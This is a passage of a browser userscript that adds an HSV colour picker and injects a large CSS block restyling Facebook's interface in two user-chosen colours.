  // distribute, sublicense, and/or sell copies of the Software, and to
  // permit persons to whom the Software is furnished to do so, subject
  // to the following conditions:
  //
  // The above copyright notice and this permission notice shall be
  // included in all copies or substantial portions of the Software.
  // 
  // THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,
  // EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
  // MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
  // NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
  // BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
  // ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
  // CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
  
  function hsvToRgb(hue, saturation, value) {
    var red;
    var green;
    var blue;
    if (value == 0.0) {
      red = 0;
      green = 0;
      blue = 0;
    } else {
      var i = Math.floor(hue * 6);
      var f = (hue * 6) - i;
      var p = value * (1 - saturation);
      var q = value * (1 - (saturation * f));
      var t = value * (1 - (saturation * (1 - f)));
      switch (i) {
        case 1: red = q; green = value; blue = p; break;
        case 2: red = p; green = value; blue = t; break;
        case 3: red = p; green = q; blue = value; break;
        case 4: red = t; green = p; blue = value; break;
        case 5: red = value; green = p; blue = q; break;
        case 6: // fall through
        case 0: red = value; green = t; blue = p; break;
      }
    }
    return {r: red, g: green, b: blue};
  }
  
  function rgbToHsv(red, green, blue) {
    var max = Math.max(Math.max(red, green), blue);
    var min = Math.min(Math.min(red, green), blue);
    var hue;
    var saturation;
    var value = max;
    if (min == max) {
      hue = 0;
      saturation = 0;
    } else {
      var delta = (max - min);
      saturation = delta / max;
      if (red == max)
        hue = (green - blue) / delta;
      else if (green == max)
        hue = 2 + ((blue - red) / delta);
      else
        hue = 4 + ((red - green) / delta);
      hue /= 6;
      if (hue < 0) hue += 1;
      if (hue > 1) hue -= 1;
    }
    return {
      h: hue,
      s: saturation,
      v: value
    };
  }
  function pageCoords(node) {
    var x = node.offsetLeft;
    var y = node.offsetTop;
    var parent = node.offsetParent;
    while (parent != null) {
      x += parent.offsetLeft;
      y += parent.offsetTop;
      parent = parent.offsetParent;
    }
    return {x: x, y: y};
  }
  
  // The real code begins here.
  var huePositionImg = document.createElement('img');
  huePositionImg.galleryImg = false;
  huePositionImg.width = 35;
  huePositionImg.height = 11;
  huePositionImg.src = HUE_SLIDER_ARROWS_LOCATION;
  huePositionImg.style.position = 'absolute';
  var hueSelectorImg = document.createElement('img');
  hueSelectorImg.galleryImg = false;
  hueSelectorImg.width = 35;
  hueSelectorImg.height = 200;
  hueSelectorImg.src = HUE_SLIDER_LOCATION;
  hueSelectorImg.style.display = 'block';
  var satValImg = document.createElement('img');
  satValImg.galleryImg = false;
  satValImg.width = 200;
  satValImg.height = 200;
  satValImg.src = SAT_VAL_SQUARE_LOCATION;
  satValImg.style.display = 'block';
  var crossHairsImg = document.createElement('img');
  crossHairsImg.galleryImg = false;
  crossHairsImg.width = 21;
  crossHairsImg.height = 21;
  crossHairsImg.src = CROSSHAIRS_LOCATION;
  crossHairsImg.style.position = 'absolute';
  
  function makeColorSelector(inputBox) {
    var rgb, hsv
    function colorChanged() {
      var hex = rgbToHex(rgb.r, rgb.g, rgb.b);
      var hueRgb = hsvToRgb(hsv.h, 1, 1);
      var hueHex = rgbToHex(hueRgb.r, hueRgb.g, hueRgb.b);
      previewDiv.style.background = hex;
      inputBox.value = hex;
      satValDiv.style.background = hueHex;
      crossHairs.style.left = ((hsv.v*199)-10).toString() + 'px';
      crossHairs.style.top = (((1-hsv.s)*199)-10).toString() + 'px';
      huePos.style.top = ((hsv.h*199)-5).toString() + 'px';
    }
    function rgbChanged() {
      hsv = rgbToHsv(rgb.r, rgb.g, rgb.b);
      colorChanged();
    }
    function hsvChanged() {
      rgb = hsvToRgb(hsv.h, hsv.s, hsv.v);
      colorChanged();
    }
    var colorSelectorDiv = document.createElement('div');
    colorSelectorDiv.style.padding = '15px';
    colorSelectorDiv.style.position = 'relative';
    colorSelectorDiv.style.height = '275px';
    colorSelectorDiv.style.width = '250px';
    var satValDiv = document.createElement('div');
    satValDiv.style.position = 'relative';
    satValDiv.style.width = '200px';
    satValDiv.style.height = '200px';
    var newSatValImg = fixPNG(satValImg);
    satValDiv.appendChild(newSatValImg);
    var crossHairs = crossHairsImg.cloneNode(false);
    satValDiv.appendChild(crossHairs);
    function satValDragged(x, y) {
      hsv.s = 1-(y/199);
      hsv.v = (x/199);
      hsvChanged();
    }
    trackDrag(satValDiv, satValDragged)
    colorSelectorDiv.appendChild(satValDiv);
    var hueDiv = document.createElement('div');
    hueDiv.style.position = 'absolute';
    hueDiv.style.left = '230px';
    hueDiv.style.top = '15px';
    hueDiv.style.width = '35px';
    hueDiv.style.height = '200px';
    var huePos = fixPNG(huePositionImg);
    hueDiv.appendChild(hueSelectorImg.cloneNode(false));
    hueDiv.appendChild(huePos);
    function hueDragged(x, y) {
      hsv.h = y/199;
      hsvChanged();
    }
    trackDrag(hueDiv, hueDragged);
    colorSelectorDiv.appendChild(hueDiv);
    var previewDiv = document.createElement('div');
    previewDiv.style.height = '50px'
    previewDiv.style.width = '50px';
    previewDiv.style.position = 'absolute';
    previewDiv.style.top = '225px';
    previewDiv.style.left = '15px';
    previewDiv.style.border = '1px solid black';
    colorSelectorDiv.appendChild(previewDiv);
    function inputBoxChanged() {
      rgb = hexToRgb(inputBox.value, {r: 0, g: 0, b: 0});
      rgbChanged();
    }
    myAddEventListener(inputBox, 'change', inputBoxChanged);
    inputBox.size = 8;
    inputBox.style.position = 'absolute';
    inputBox.style.right = '15px';
    inputBox.style.top = (225 + (25 - (inputBox.offsetHeight/2))).toString() + 'px';
    colorSelectorDiv.appendChild(inputBox);
    inputBoxChanged();
    return colorSelectorDiv;
  }
  /** End of code that's not written by me. **/

  (node=document.getElementById("colour1").getElementsByTagName("input")[0]).parentNode.insertBefore(makeColorSelector(node), null);
  (node=document.getElementById("colour2").getElementsByTagName("input")[0]).parentNode.insertBefore(makeColorSelector(node), null);
}

function addStyle(setup) {
  if (!setup.colour1 && !setup.colour2)
    setup = eval('({colour1:"#3b5998", colour2:"#6d84b4"})');

  style = document.getElementsByTagName('head')[0].appendChild(document.createElement('style'));
  style.type = 'text/css';
  style.innerHTML = ".groupProfileHeader .fsxl {" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".groups_highlight_box {" +
                  "    color: #535353;" +
                  "}" +
                  ".uiComposer .attachmentFrame {" +
                  "    border-color: #B4BBCD #B4BBCD #CCCCCC;" +
                  "}" +
                  ".uiComposerHideMessageBox .attachmentFrame, .uiComposerHideInput .attachmentFrame {" +
                  "    border-bottom-color: #B4BBCD;" +
                  "}" +
                  ".uiComposerMessageBox {" +
                  "    border-color: #B4BBCD;" +
                  "    border-right: 1px solid #B4BBCD;" +
                  "}" +
                  ".uiComposerMessageBox .inputContainer {" +
                  "    border: 1px solid #B4BBCD;" +
                  "}" +
                  ".uiComposerMessageBox .composerTypeahead {" +
                  "    border-bottom: 1px solid #B4BBCD !important;" +
                  "    border-color: #B4BBCD !important;" +
                  "}" +
                  ".uiComposerMessageBox .composerTypeahead .wrap {" +
                  "    border-color: #B4BBCD !important;" +
                  "}" +
                  ".uiMentionsInput .highlighter b {" +
                  "    background: none repeat scroll 0 0 #D8DFEA;" +
                  "}" +
                  ".uiToken {" +
                  "    background: none repeat scroll 0 0 #E2E6F0;" +
                  "    border: 1px solid #9DACCC;" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".uiTokenSelected {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiInlineTokenizer {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".interaction_form .underline {" +
                  "    border-bottom: 1px solid #EDEFF5;" +
                  "}" +
                  ".interaction_form .link_placeholder {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".giftshop .extra_text strong {" +
                  "    color: #008000;" +
                  "}" +
                  "#embedded_store #giftshop_search_option_input {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  "#embedded_store #store_footer {" +
                  "    border-top: 1px solid #D5D5DF;" +
                  "}" +
                  ".UIErrorForm_Field select {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".UIErrorForm_NoError {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".UIErrorForm_ErrorField {" +
                  "    border: 2px solid #DD3C10;" +
                  "}" +
                  ".UIErrorForm_Flag_Inner {" +
                  "    background-color: #FFEBE8;" +
                  "    border-bottom: 1px solid #EB8266;" +
                  "}" +
                  ".contextual_dialog .contextual_dialog_content {" +
                  "    border-color: #333333 #333333 #283E6A;" +
                  "}" +
                  ".UIHelpFlag_Close:hover {" +
                  "    background-color: #F9EFB3;" +
                  "}" +
                  ".UIHelpFlag_Block .UIHelpFlag_Inner {" +
                  "    background-color: #FFF9D7;" +
                  "    border-bottom: 1px solid #E2C822;" +
                  "}" +
                  ".UIErrorFlag .UIErrorFlag_Inner {" +
                  "    background-color: #FFEBE8;" +
                  "    border-bottom: 1px solid #EB8266;" +
                  "}" +
                  ".error_field {" +
                  "    background: none repeat scroll 0 0 #DD3C10;" +
                  "}" +
                  ".error_field input.inputtext, .error_field input.inputpassword, .error_field #captcha_response {" +
                  "    border-color: #DD3C10;" +
                  "}" +
                  "#ci_module_list li.ci_module:hover {" +
                  "    background-color: #EDEFF4;" +
                  "}" +
                  "#ci_module_list li.ci_module.expanded {" +
                  "    background-color: #EDEFF4;" +
                  "}" +
                  "#wizard_step #ci_module_list, #wizard_step #ci_module_list li.ci_module.expanded, #wizard_step #ci_module_list li.ci_module.expanded:hover {" +
                  "    background-color: #EDEDED;" +
                  "}" +
                  "#ci_module_list .ci_module {" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  ".autoimport .error {" +
                  "    background: none repeat scroll 0 50% #FFEBE8;" +
                  "    border: 1px solid #DD3C10;" +
                  "}" +
                  "#filter a:hover {" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  "#filter a.selected {" +
                  "    border-color: #D8DFEA #D8DFEA "+setup.colour1+";" +
                  "}" +
                  ".friendtable .info .updates {" +
                  "    background: none repeat scroll 0 0 #FFF8CC;" +
                  "    border-bottom: 1px solid #FFE222;" +
                  "}" +
                  ".friendtable .actions a, .friendtable .actions span {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".friendtable .actions a:hover {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  ".confirmcount {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".confirm {" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".public_listing .search_bar span.highlight {" +
                  "    background-color: #FFF8CC;" +
                  "}" +
                  "#public_listing_pages .category h3 {" +
                  "    border-bottom: 1px solid #D3DAE8;" +
                  "}" +
                  ".public_listing .logged_in_vertical_alert {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border: 1px solid #E2C822;" +
                  "}" +
                  ".uiComboInput {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".fbEmu .body a.signature {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".fbEmuHide .thex:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  ".pagerpro .pagerpro_a:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-color: #D8DFEA #D8DFEA "+setup.colour1+";" +
                  "}" +
                  ".pagerpro .current .pagerpro_a {" +
                  "    border-bottom: 2px solid "+setup.colour1+";" +
                  "    border-color: "+setup.colour1+";" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".pagerpro .current .pagerpro_a:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  ".footer_bar .pagerpro .pagerpro_a:hover {" +
                  "    border-bottom: 2px solid "+setup.colour1+";" +
                  "    border-top: 2px solid "+setup.colour1+";" +
                  "}" +
                  ".footer_bar .pagerpro .current .pagerpro_a, .footer_bar .pagerpro .current .pagerpro_a:hover {" +
                  "    border-top: 2px solid "+setup.colour1+";" +
                  "}" +
                  ".photo_tag_frame {" +
                  "    border: 5px solid #D8DFEA;" +
                  "}" +
                  ".editphotos .photo_tag_frame {" +
                  "    border: 4px solid #D8DFEA;" +
                  "}" +
                  ".photo_tag_frame_inside {" +
                  "    border: 2px solid "+setup.colour1+";" +
                  "}" +
                  "}" +
                  "#photo_tag_selector {" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  "#pts_invite_msg {" +
                  "    background-color: #FFFFBB;" +
                  "}" +
                  ".photo_list .album img:hover {" +
                  "    border: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".sharelink {" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".single_photo_header h2 {" +
                  "    color: #192B46;" +
                  "}" +
                  "#photocomment .actions a small {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#comment_error {" +
                  "    color: #996666;" +
                  "}" +
                  "#photoactions a {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  "#photoactions a:hover, #photoactions .action_link:hover {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  "#rotateleft a:hover {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z4/r/YMPqumRb_-C.gif\") no-repeat scroll 2px 2px "+setup.colour1+";" +
                  "}" +
                  "#rotateright a:hover {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zx/r/qAjhwbqxvdd.gif\") no-repeat scroll 3px 2px "+setup.colour1+";" +
                  "}" +
                  "#tagging_instructions {" +
                  "    background: none repeat scroll 0 0 #FFFBE2;" +
                  "    border: 1px solid #FFE222;" +
                  "}" +
                  ".tag_outer {" +
                  "    border: 7px solid #D8DFEA;" +
                  "}" +
                  ".tag_inner {" +
                  "    border: 2px solid "+setup.colour1+";" +
                  "}" +
                  "a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "select {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  "textarea, .inputtext, .inputpassword {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".inputbutton, .inputsubmit {" +
                  "    background-color: "+setup.colour1+";" +
                  "    border-color: #D9DFEA #0E1F5B #0E1F5B #D9DFEA;" +
                  "}" +
                  "button.as_link {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".UIComposer_PrivacyCallout_Title, .UIComposer_PrivacyCallout_Text {" +
                  "    border: 1px solid #467C2C;" +
                  "}" +
                  ".UIComposer_PrivacyCallout_Title {" +
                  "    background-color: #67A54B;" +
                  "}" +
                  ".UIActionLinks_bottom a, .UIActionLinks_bottom button.as_link, .UIActionLinks_left, .UIActionLinks_right {" +
                  "    color: "+setup.colour2+";" +
                  "}" +
                  ".UIActionLinks .uiBlingBox {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".typeahead_list {" +
                  "    border-color: -moz-use-text-color #BDC7D8 #BDC7D8;" +
                  "    border-right: 1px solid #BDC7D8;" +
                  "}" +
                  ".typeahead_list .typeahead_suggestion em {" +
                  "    background: none repeat scroll 0 0 #D8DFEA;" +
                  "}" +
                  ".typeahead_list .typeahead_selected {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  ".typeahead_list .typeahead_selected small {" +
                  "    color: #95A5C6;" +
                  "}" +
                  ".typeahead_list .typeahead_selected em {" +
                  "    background: none repeat scroll 0 0 #5670A6;" +
                  "}" +
                  "input.typeahead_found {" +
                  "    background-color: #E1E9F6;" +
                  "}" +
                  ".typeahead_friendlist_icon.on_selected {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "div.standard_tokenizer div.tokenizer {" +
                  "    border: 1px solid #8F96BD;" +
                  "}" +
                  ".pop_content h2.dialog_title {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  ".pop_content h2.dialog_title .dialog_x {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "}" +
                  ".pop_content h2.secure {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zu/r/jp8TzrZb6J1.png\") no-repeat scroll 98% 50% "+setup.colour2+";" +
                  "}" +
                  ".pop_content h2.loading {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z-/r/AGUNXgX_Wx3.gif\") no-repeat scroll 98% 50% "+setup.colour2+";" +
                  "}" +
                  ".pop_content h2.dialog_loading {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z-/r/AGUNXgX_Wx3.gif\") no-repeat scroll 400px 10px "+setup.colour2+";" +
                  "}" +
                  ".uiButtonSpecial {" +
                  "    background-color: #69A74E;" +
                  "    border-color: #3B6E22 #3B6E22 #2C5115;" +
                  "}" +
                  ".uiButtonSpecial:active {" +
                  "    background: none repeat scroll 0 0 #609946;" +
                  "    border-bottom-color: #3B6E22;" +
                  "}" +
                  ".uiButtonSpecial.uiButtonDisabled, .uiButtonSpecial.uiButtonDisabled:active, .uiButtonSpecial.uiButtonDisabled:focus, .uiButtonSpecial.uiButtonDisabled:hover {" +
                  "    background: none repeat scroll 0 0 #B4D3A7;" +
                  "    border-color: #9DB791;" +
                  "}" +
                  ".uiButtonConfirm {" +
                  "    background-color: #5B74A8;" +
                  "    border-color: #29447E #29447E #1A356E;" +
                  "}" +
                  ".uiButtonConfirm:active {" +
                  "    background: none repeat scroll 0 0 #4F6AA3;" +
                  "    border-bottom-color: #29447E;" +
                  "}" +
                  ".uiButtonConfirm.uiButtonDisabled, .uiButtonConfirm.uiButtonDisabled:active, .uiButtonConfirm.uiButtonDisabled:focus, .uiButtonConfirm.uiButtonDisabled:hover {" +
                  "    background: none repeat scroll 0 0 #ADBAD4;" +
                  "    border-color: #94A2BF;" +
                  "}" +
                  ".uiLinkButton input {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiLinkButton:hover, .uiLinkButton input:hover, .uiLinkButton input:focus, .uiLinkButton input:active {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiBoxLightblue {" +
                  "    background-color: #EDEFF4;" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".uiBoxRed {" +
                  "    background-color: #FFEBE8;" +
                  "    border: 1px solid #DD3C10;" +
                  "}" +
                  ".uiBoxYellow {" +
                  "    background-color: #FFF9D7;" +
                  "    border: 1px solid #E2C822;" +
                  "}" +
                  ".uiListBulleted {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiTextHighlight {" +
                  "    background: none repeat scroll 0 0 #FFF8CC;" +
                  "    border-bottom: 1px solid #FFE222;" +
                  "}" +
                  ".uiMenu {" +
                  "    border-color: #777777 #777777 #293E6A;" +
                  "}" +
                  ".uiMenuItem a:active, .uiMenuItem a:focus {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiMenu .checked a:active, .uiMenu .checked a:focus {" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  ".uiSelector .openToggler .uiSelectorButton, .uiSelector .openToggler .uiSelectorButton:active, .uiSelector .openToggler .uiSelectorButton:focus, .uiSelector .openToggler .uiSelectorButton:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" "+setup.colour2+";" +
                  "}" +
                  ".uiHeader h2 {" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".uiHeader h2 a {" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".action_links_title .comment_link, .action_links_bottom .comment_link, .feedback_toggle_link .feedback_show_link, .feedback_toggle_link .feedback_hide_link, .UIActionLinks .comment_link {" +
                  "    color: "+setup.colour2+";" +
                  "}" +
                  ".uiUfi .ufiItem {" +
                  "    background-color: #EDEFF4;" +
                  "    border-bottom: 1px solid #E5EAF1;" +
                  "}" +
                  ".uiUfi .uiUfiUnseenItem {" +
                  "    border-left: 2px solid #A8B2CE;" +
                  "}" +
                  "div.file_help {" +
                  "    background: none repeat scroll 0 0 #FCFCFC;" +
                  "}" +
                  ".editor #start_calendar, .editor #end_calendar {" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-left: 1px solid #D8DFEA;" +
                  "    border-right: 1px solid #D8DFEA;" +
                  "}" +
                  "#new_ff #friend_guesser div.see_more {" +
                  "    border-top: 1px solid #D8DFEA;" +
                  "}" +
                  "#new_ff #friend_guesser a.see_more:hover {" +
                  "    background-color: #E6EDF8;" +
                  "}" +
                  "#fbDockChatBuddylistNub .chat_buddylist_typeahead input {" +
                  "    border-color: #93A2C1;" +
                  "}" +
                  ".fbChatBuddylist a.friend em {" +
                  "    background-color: #DCE1E8;" +
                  "}" +
                  ".fbChatBuddylist a.selected em, .fbChatBuddylistContent a:hover em {" +
                  "    background-color: #5670A6;" +
                  "}" +
                  ".fbChatBuddylist a.friend:hover, .fbChatBuddylist a.selected {" +
                  "    background-color: "+setup.colour2+" !important;" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#fbDockChatBuddylist #reorder_fl_alert {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border-bottom: 1px solid #E2C822;" +
                  "}" +
                  "#fbDockChatBuddylist #error_fl_alert {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border-bottom: 1px solid #E2C822;" +
                  "}" +
                  ".fbChatBuddylistPanel .flyout_open a.panel_item {" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  ".fbChatBuddylistPanel .flyout_open {" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  ".fbChatBuddylistPanel .flyout a:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".fbDockChatTab.highlight .fbNubButton {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zq/r/hjN1fTOtVAm.png\") repeat-x scroll 0 0 "+setup.colour2+" !important;" +
                  "    border-color: #283B8A;" +
                  "}" +
                  ".fbDockChatTab .inputContainer {" +
                  "    border-top: 1px solid #93A2C1;" +
                  "}" +
                  ".fbDockChatTab .titlebarReportLink {" +
                  "    color: #B2BED7;" +
                  "}" +
                  "#jewelBoxMail .author {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".negativeBalance {" +
                  "    color: #F03D25;" +
                  "}" +
                  ".fbNubFlyoutTitlebar {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: #254588 #254588 -moz-use-text-color;" +
                  "}" +
                  ".fbNubFlyoutHeader.videoHeader {" +
                  "    border-bottom: 1px solid #93A2C1;" +
                  "}" +
                  ".jewelCount {" +
                  "    background-color: #00376A;" +
                  "}" +
                  ".jewelCount span {" +
                  "    background-color: #F03D25;" +
                  "    border-color: -moz-use-text-color #DD3822 #DD3822;" +
                  "    border-right: 1px solid #DD3822;" +
                  "}" +
                  ".jewelToggler:active, .jewelToggler:focus, .jewelToggler:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  "#jewelCase .jewelBox {" +
                  "    border-color: #333333 #333333 #293E6A;" +
                  "}" +
                  "#jewelCase .jewelItemNew {" +
                  "    background: none repeat scroll 0 0 #EFF1F7;" +
                  "}" +
                  "#jewelCase .jewelItemResponded {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "}" +
                  "#jewelCase .jewelFooter a:hover, #jewelCase .jewelFooter a:active, #jewelCase .jewelFooter a:focus {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#jewelCase .jewelHighlightItem li a:hover, #jewelCase .jewelHighlightItem li a:active, #jewelCase .jewelHighlightItem li a:focus {" +
                  "    background-color: "+setup.colour2+" !important;" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#jewelBoxNotif .blueName {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#blueBar {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "#pageLogo a {" +
                  "    background-image: url("+logo+");" +
                  "    background-position: 0;" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "#pageLogo a:hover, #pageLogo a:focus, #pageLogo a:active {" +
                  "    background-image: url("+logo+");" +
                  "    background-position: 0;" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  "#headNav {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  "#pageNav a:hover, #pageNav a:focus, #pageNav a:active {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "#navAccount ul {" +
                  "    border-color: #333333 #333333 #2D4486;" +
                  "}" +
                  "#navAccount ul a, #navAccount ul .logoutButton input {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#navAccount ul a:hover, #navAccount ul a:focus, #navAccount ul a:active, #navAccount .logoutButton:hover input, #navAccount .logoutButton input:active, #navAccount .logoutButton input:focus {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "ul #navAccountInfo a:hover, ul #navAccountInfo a:focus, ul #navAccountInfo a:active {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#navSearch .uiTypeahead, #navSearch .uiTypeahead .wrap {" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .item:hover, .uiSideNav .item:active, .uiSideNav .item:focus, .uiSideNav .subitem:hover, .uiSideNav .subitem:active, .uiSideNav .subitem:focus {" +
                  "    background-color: #EFF2F7;" +
                  "}" +
                  ".uiSideNav .selectedItem .item, .uiSideNav .selectedItem .item:hover, .uiSideNav ul .selectedItem .subitem, .uiSideNav ul .selectedItem .subitem:hover {" +
                  "    background-color: #D8DFEA;" +
                  "}" +
                  ".uiSideNav .loading a {" +
                  "    background-color: #EFF2F7;" +
                  "    border-color: #EFF2F7 #EFF2F7 #FFFFFF;" +
                  "}" +
                  ".status {" +
                  "    background-color: #FFF9D7;" +
                  "    border-color: #E2C822;" +
                  "}" +
                  ".error {" +
                  "    background-color: #FFEBE8;" +
                  "    border-color: #DD3C10;" +
                  "}" +
                  ".error a {" +
                  "    color: #DD3C10;" +
                  "}" +
                  ".explanation_note {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".explanation_note a {" +
                  "    color: #DD3C10;" +
                  "}" +
                  ".uiSearchInput {" +
                  "    border-color: #6484B4 #899BC1 #899BC1;" +
                  "    border-right: 1px solid #899BC1;" +
                  "}" +
                  ".uiPhotoThumb:hover {" +
                  "    border: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCountSprited {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCountSprited span.countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem .subitem:hover .uiSideNavCountSprited span.countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem a:hover .uiSideNavCountSprited span.countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCount {" +
                  "    background-color: #D8DFEA;" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem .subitem:hover .uiSideNavCount {" +
                  "    background-color: #D8DFEA;" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem a:hover .uiSideNavCount {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCount .countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiStreamSubstories .unseenItem {" +
                  "    border-left: 2px solid #A8B2CE;" +
                  "}" +
                  ".uiTypeahead {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".uiTypeahead .wrap {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".uiTypeahead .selected .textInput {" +
                  "    background: none repeat scroll 0 0 #E2E8F6;" +
                  "}" +
                  ".uiTypeaheadView ul {" +
                  "    border-color: #333333 #333333 #293E6A;" +
                  "}" +
                  ".uiTypeaheadView strong {" +
                  "    background-color: #D8DFEA;" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiTypeaheadView .selected {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiTypeaheadView .selected strong {" +
                  "    background-color: #5670A6;" +
                  "}" +
                  ".uiTypeahead .uiTypeaheadView .calltoaction.selected {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".typeaheadLoading .uiTypeaheadView .calltoaction.selected {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z-/r/AGUNXgX_Wx3.gif\") no-repeat scroll 50% 50% "+setup.colour2+";" +
                  "}" +
                  ".uiTypeaheadView .search img {" +
                  "    background-color: #ECEFF5;" +
                  "}" +
